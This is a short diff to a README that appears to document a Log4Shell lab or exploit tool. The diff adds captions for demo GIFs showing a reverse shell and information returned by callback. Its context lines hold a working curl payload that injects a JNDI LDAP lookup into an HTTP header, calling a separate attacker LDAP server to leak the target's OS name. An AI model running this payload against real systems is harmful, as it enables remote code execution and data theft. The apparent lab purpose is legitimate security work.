@@ -31,7 +31,11 @@ docker exec -it log4j_attacker bash
 curl http://10.10.10.2:8080 -H 'X-Api-Version: ${jndi:ldap://10.10.10.3:1389/${sys:os.name}}'
 ```
 ##### Example:
+Reverse shell
 ![Serve only](./attachments/serve.gif)
+
+Getting information from callback(Note: `-c 'touch /dev/shm/vulnerable' is not needed`):
+![Info](./attachments/info.gif)
 
 ### Options
 ```bash
